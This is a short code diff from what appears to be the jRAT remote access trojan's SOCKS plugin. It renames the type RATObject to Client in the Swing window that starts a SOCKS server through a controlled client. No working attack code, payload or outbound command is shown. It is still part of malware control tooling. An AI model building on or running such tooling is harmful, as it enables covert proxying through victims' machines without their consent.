@@ -23,7 +23,7 @@ import javax.swing.SpinnerNumberModel;
 import javax.swing.border.EmptyBorder;
 
 import se.jrat.plugins.socks.ClientThread;
-import jrat.api.RATObject;
+import jrat.api.Client;
 
 @SuppressWarnings("serial")
 public class FrameSocks extends JFrame {
@@ -37,7 +37,7 @@ public class FrameSocks extends JFrame {
 	private JTextField txtPass;
 	private JCheckBox chckbxUseAuthentication;
 	private JSpinner spinner;
-	private RATObject ratobj;
+	private Client ratobj;
 	private JLabel lbl;
 	private JButton btnStop;
 	private JButton btnStart;
@@ -45,7 +45,7 @@ public class FrameSocks extends JFrame {
 	private ServerSocket socksServer;
 	private ServerSocket incomingSocksConnection;
 
-	public FrameSocks(RATObject ratobj) {
+	public FrameSocks(Client ratobj) {
 		this.ratobj = ratobj;
 		setTitle("Start SOCKS server");
 		setResizable(false);
